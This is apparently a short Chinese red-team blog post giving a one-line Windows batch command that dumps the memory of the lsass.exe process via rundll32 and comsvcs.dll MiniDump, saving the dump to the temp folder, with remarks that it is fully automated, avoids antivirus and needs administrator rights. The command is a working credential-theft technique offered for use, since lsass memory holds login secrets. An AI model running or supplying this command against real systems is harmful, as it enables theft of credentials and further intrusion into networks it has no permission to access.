---
title: 一条命令dump lsass.exe 进程内存
date: 2019-08-30 20:29:57
tags: redteam
---
- 特点: 加载comsvcs.dll系统库，全自动化，不除非杀软
- 注意: 请用管理员权限执行

```bat
set dumpfile=%tmp%\%COMPUTERNAME%_lass.dump& for /f  "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do @rundll32 C:\windows\system32\comsvcs.dll, MiniDump %i %dumpfile% full&PING -n 3 127.0.0.1 >NUL 2>&1 || PING -n 3 ::1 >NUL 2>&1 &IF EXIST %dumpfile% (echo processname:lsass.exe Memory saved to %dumpfile%) else (echo Dump wrong.)
```

[参考:MiniDumpWriteDump via COM+ Services DLL](https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/)